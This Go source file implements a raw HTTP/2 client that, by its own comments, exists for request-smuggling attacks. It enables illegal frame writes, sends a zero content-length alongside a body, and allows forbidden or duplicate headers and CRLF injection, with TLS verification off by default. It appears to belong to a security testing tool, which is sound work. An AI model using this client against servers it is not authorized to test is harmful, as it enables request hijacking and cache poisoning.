package client

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// RawH2Client allows sending raw H2 frames to bypass standard client normalizations.
// This is essential for H2 smuggling attacks where we need to:
// - Send content-length: 0 but include a DATA frame with body
// - Inject CRLF into pseudo-headers
// - Send duplicate pseudo-headers
// - Set transfer-encoding header (forbidden by H2 spec)
type RawH2Client struct {
	Timeout  time.Duration
	Insecure bool
}

func NewRawH2Client(timeout time.Duration) *RawH2Client {
	return &RawH2Client{Timeout: timeout, Insecure: true}
}

// Do sends an H2 request and reads the response.
// Implements the Requester interface.
func (c *RawH2Client) Do(req *Request, timeout time.Duration) (*Response, error) {
	if timeout == 0 {
		timeout = c.Timeout
	}

	u, err := url.Parse(req.URL)
	if err != nil {
		return nil, err
	}

	host := u.Host
	if u.Port() == "" {
		host = host + ":443"
	}

	conf := &tls.Config{
		InsecureSkipVerify: c.Insecure,
		NextProtos:         []string{"h2"},
		ServerName:         u.Hostname(),
	}

	conn, err := tls.DialWithDialer(
		&net.Dialer{Timeout: timeout},
		"tcp", host, conf,
	)
	if err != nil {
		return nil, fmt.Errorf("H2 TLS dial: %w", err)
	}
	defer conn.Close()

	// Verify ALPN negotiated h2
	if conn.ConnectionState().NegotiatedProtocol != "h2" {
		return nil, fmt.Errorf("server did not negotiate h2 (got %q)", conn.ConnectionState().NegotiatedProtocol)
	}

	// Send H2 connection preface
	if _, err := conn.Write([]byte(http2.ClientPreface)); err != nil {
		return nil, fmt.Errorf("writing H2 preface: %w", err)
	}

	framer := http2.NewFramer(conn, conn)
	framer.AllowIllegalWrites = true // we need this for smuggling

	// Decoder for response headers
	decoder := hpack.NewDecoder(4096, nil)
	framer.ReadMetaHeaders = decoder

	// Send initial SETTINGS
	if err := framer.WriteSettings(
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1048576},
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 100},
	); err != nil {
		return nil, fmt.Errorf("writing SETTINGS: %w", err)
	}

	// Read and process initial frames from server (SETTINGS, WINDOW_UPDATE, etc.)
	if err := c.processHandshake(framer, conn, timeout); err != nil {
		return nil, fmt.Errorf("H2 handshake: %w", err)
	}

	// Build HPACK-encoded headers
	path := u.Path
	if path == "" {
		path = "/"
	}
	if u.RawQuery != "" {
		path += "?" + u.RawQuery
	}

	hdrs := []hpack.HeaderField{
		{Name: ":method", Value: req.Method},
		{Name: ":scheme", Value: u.Scheme},
		{Name: ":path", Value: path},
		{Name: ":authority", Value: u.Host},
	}

	// Add custom headers (including forbidden ones like transfer-encoding)
	for k, v := range req.Headers {
		hdrs = append(hdrs, hpack.HeaderField{Name: strings.ToLower(k), Value: v})
	}

	// Add content-length if explicitly set (even if 0 — this is the attack)
	if req.ContentLength >= 0 {
		hdrs = append(hdrs, hpack.HeaderField{
			Name:  "content-length",
			Value: fmt.Sprintf("%d", req.ContentLength),
		})
	}

	// Encode headers
	var headerBuf bytes.Buffer
	henc := hpack.NewEncoder(&headerBuf)
	for _, h := range hdrs {
		if err := henc.WriteField(h); err != nil {
			return nil, fmt.Errorf("HPACK encode: %w", err)
		}
	}

	// Send HEADERS frame (stream 1)
	endStream := len(req.Body) == 0 && req.ContentLength <= 0
	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: headerBuf.Bytes(),
		EndStream:     endStream,
		EndHeaders:    true,
	}); err != nil {
		return nil, fmt.Errorf("writing HEADERS: %w", err)
	}

	// Send DATA frame even if content-length is 0 (this is the smuggling attack)
	if !endStream {
		if len(req.Body) > 0 {
			if err := framer.WriteData(1, true, req.Body); err != nil {
				return nil, fmt.Errorf("writing DATA: %w", err)
			}
		} else {
			if err := framer.WriteData(1, true, nil); err != nil {
				return nil, fmt.Errorf("writing empty DATA: %w", err)
			}
		}
	}

	// Read response
	return c.readResponse(framer, conn, timeout)
}

// DoWithCustomHeaders sends H2 request with exact header control.
// Allows duplicate pseudo-headers, CRLF injection, etc.
func (c *RawH2Client) DoWithCustomHeaders(
	targetURL string,
	headers []hpack.HeaderField,
	body []byte,
	timeout time.Duration,
) (*Response, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	host := u.Host
	if u.Port() == "" {
		host = host + ":443"
	}

	conf := &tls.Config{
		InsecureSkipVerify: c.Insecure,
		NextProtos:         []string{"h2"},
		ServerName:         u.Hostname(),
	}

	conn, err := tls.DialWithDialer(
		&net.Dialer{Timeout: timeout},
		"tcp", host, conf,
	)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	if conn.ConnectionState().NegotiatedProtocol != "h2" {
		return nil, fmt.Errorf("h2 not negotiated")
	}

	if _, err := conn.Write([]byte(http2.ClientPreface)); err != nil {
		return nil, err
	}

	framer := http2.NewFramer(conn, conn)
	framer.AllowIllegalWrites = true

	decoder := hpack.NewDecoder(4096, nil)
	framer.ReadMetaHeaders = decoder

	if err := framer.WriteSettings(
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1048576},
	); err != nil {
		return nil, err
	}

	if err := c.processHandshake(framer, conn, timeout); err != nil {
		return nil, err
	}

	// Encode custom headers exactly as provided
	var headerBuf bytes.Buffer
	henc := hpack.NewEncoder(&headerBuf)
	for _, h := range headers {
		if err := henc.WriteField(h); err != nil {
			return nil, err
		}
	}

	endStream := len(body) == 0
	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: headerBuf.Bytes(),
		EndStream:     endStream,
		EndHeaders:    true,
	}); err != nil {
		return nil, err
	}

	if !endStream {
		if err := framer.WriteData(1, true, body); err != nil {
			return nil, err
		}
	}

	return c.readResponse(framer, conn, timeout)
}

// processHandshake reads initial H2 frames during connection setup.
func (c *RawH2Client) processHandshake(framer *http2.Framer, conn net.Conn, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		f, err := framer.ReadFrame()
		if err != nil {
			// Timeout during handshake is acceptable — server may not send anything
			if isTimeout(err) {
				return nil
			}
			return err
		}

		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				// ACK the server's settings
				if err := framer.WriteSettingsAck(); err != nil {
					return err
				}
			} else {
				// Server ACK'd our settings — handshake complete
				return nil
			}
		case *http2.WindowUpdateFrame:
			// Ignore window updates during handshake
		case *http2.PingFrame:
			// Respond to PINGs
			if err := framer.WritePing(true, f.Data); err != nil {
				return err
			}
		case *http2.GoAwayFrame:
			return fmt.Errorf("server sent GOAWAY during handshake: %v", f.ErrCode)
		}
	}

	return nil
}

// readResponse reads H2 response frames and constructs a Response.
func (c *RawH2Client) readResponse(framer *http2.Framer, conn net.Conn, timeout time.Duration) (*Response, error) {
	resp := &Response{
		Headers: make(map[string]string),
	}
	start := time.Now()
	deadline := start.Add(timeout)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(timeout))
		f, err := framer.ReadFrame()
		if err != nil {
			if resp.StatusCode > 0 {
				// We got headers at least — return what we have
				resp.Duration = time.Since(start)
				return resp, nil
			}
			return nil, fmt.Errorf("reading response frame: %w", err)
		}

		switch f := f.(type) {
		case *http2.MetaHeadersFrame:
			if f.StreamID == 1 {
				for _, hf := range f.Fields {
					if hf.Name == ":status" {
						resp.StatusCode, _ = strconv.Atoi(hf.Value)
					} else {
						resp.Headers[hf.Name] = hf.Value
					}
				}
				if f.StreamEnded() {
					resp.Duration = time.Since(start)
					return resp, nil
				}
			}

		case *http2.DataFrame:
			if f.StreamID == 1 {
				resp.Body = append(resp.Body, f.Data()...)
				if f.StreamEnded() {
					resp.Duration = time.Since(start)
					return resp, nil
				}
			}

		case *http2.GoAwayFrame:
			resp.Duration = time.Since(start)
			if resp.StatusCode > 0 {
				return resp, nil
			}
			return nil, fmt.Errorf("server sent GOAWAY: %v", f.ErrCode)

		case *http2.RSTStreamFrame:
			if f.StreamID == 1 {
				resp.Duration = time.Since(start)
				if resp.StatusCode > 0 {
					return resp, nil
				}
				return nil, fmt.Errorf("server reset stream: %v", f.ErrCode)
			}

		case *http2.WindowUpdateFrame:
			// Ignore

		case *http2.PingFrame:
			if !f.IsAck() {
				framer.WritePing(true, f.Data)
			}

		case *http2.SettingsFrame:
			if !f.IsAck() {
				framer.WriteSettingsAck()
			}
		}
	}

	resp.Duration = time.Since(start)
	if resp.StatusCode > 0 {
		return resp, nil
	}
	return nil, fmt.Errorf("response timeout after %v", timeout)
}

func isTimeout(err error) bool {
	if err == nil {
		return false
	}
	netErr, ok := err.(net.Error)
	return ok && netErr.Timeout()
}
